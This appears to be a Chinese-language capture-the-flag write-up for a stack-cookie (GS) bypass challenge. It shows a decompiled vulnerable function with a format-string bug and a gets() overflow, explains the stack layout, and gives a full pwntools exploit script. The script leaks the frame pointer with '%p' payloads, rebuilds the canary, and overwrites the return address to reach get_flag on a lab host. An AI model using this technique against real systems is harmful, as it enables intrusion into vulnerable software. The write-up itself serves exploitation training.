# 系统层漏洞利用与逆向分析-GS缓冲区安全检查利用-G4 WriteUp

本关考查子函数调用时的栈帧布局。

观察漏洞代码反编译结果，部分参数已重命名：

```c
undefined4 FUN_00401040(void)

{
  undefined *puVar1;
  FILE *pFVar2;
  undefined4 uVar3;
  int iVar4;
  int iVar5;
  undefined1 buff256 [256];
  char buff64 [64];
  uint stack_cookie;
  
  stack_cookie = DAT_0041d040 ^ (uint)&stack0xfffffffc;
  iVar5 = 0;
  iVar4 = 4;
  uVar3 = 0;
  puVar1 = FUN_00404238(0);
  FUN_004046cb((int)puVar1,uVar3,iVar4,iVar5);
  iVar5 = 0;
  iVar4 = 4;
  uVar3 = 0;
  puVar1 = FUN_00404238(1);
  FUN_004046cb((int)puVar1,uVar3,iVar4,iVar5);
  iVar5 = 0;
  iVar4 = 4;
  uVar3 = 0;
  puVar1 = FUN_00404238(2);
  FUN_004046cb((int)puVar1,uVar3,iVar4,iVar5);
  printf(0x41d000);
  printf(0x41d010);
  printf(0x41d020);
  pFVar2 = (FILE *)FUN_00404238(0);
  fread(buff64,0x40,pFVar2);
  printf_wrapper((int)buff64);
  printf(0x41d030);
  gets(buff256);
  return 0;
}
```

程序先读取最大64字节的输入到buff64中，再调用`printf_wrapper`函数，函数内部将`buffer64`作为`printf`的`fmt`直接传入，存在格式化字符串漏洞。然后再调用`gets`函数读取输入到buff256中，存在缓冲区溢出漏洞。

调用`printf_wrapper`函数内部的`printf(buff64)`函数时，栈帧布局如下：

```
RET(从漏洞函数返回的地址):4
EBP:4
stack_cookie:4
buff64:64
buff256:256
buff64地址:4
RET(从wrapper返回的地址):4
漏洞函数EBP:4
buff64地址:4
```

第一个`%p`参数对应漏洞函数的EBP地址，同时结合程序自己输出的全局Cookie，可以异或计算出漏洞函数栈的cookie值。

缓冲区溢出payload构造如下：（256 + 64）字节填充数据 + 漏洞函数栈的cookie值 + 随便一字节填充 + get_flag函数地址

## 代码

```python
from pwn import *

r = remote('172.17.81.169', 9999)

GET_FLAG = 0x00401000
OFFSET_BUFFER_COOKIE = 256 + 64

# 读取banner，获取全局cookie
buffer = r.recvline().decode().split(' @ ')[1]
print(f"Buffer address: {buffer}")
global_cookie = r.recvline().decode().split(' : ')[1]
print(f"Global cookie: {global_cookie}")
global_cookie = int(global_cookie, 16)
r.recvuntil(b': ')

# 读取栈内容
payload = b'%p'* 31
r.sendline(payload)
stack = r.recvline().decode()
stack = [stack[i:i+8] for i in range(0, len(stack), 8)]
print(f"Stack content (split): {stack}")
r.recvuntil(b': ')
# 计算栈cookie
EBP = int(stack[0], 16)
print(f"EBP: {EBP}")
stack_cookie = global_cookie ^ EBP
print(f"Stack cookie: {stack_cookie}")
# 构造payload
payload = b'A' * OFFSET_BUFFER_COOKIE + p32(stack_cookie) + p32(0xdeadbeef) + p32(GET_FLAG)
r.sendline(payload)

try:
    data = r.recvall(timeout=5)
    log.info(f"Received:\n{data.decode(errors='replace')}")
except:
    data = r.recv(timeout=3)
    log.info(f"Received:\n{data.decode(errors='replace')}")
```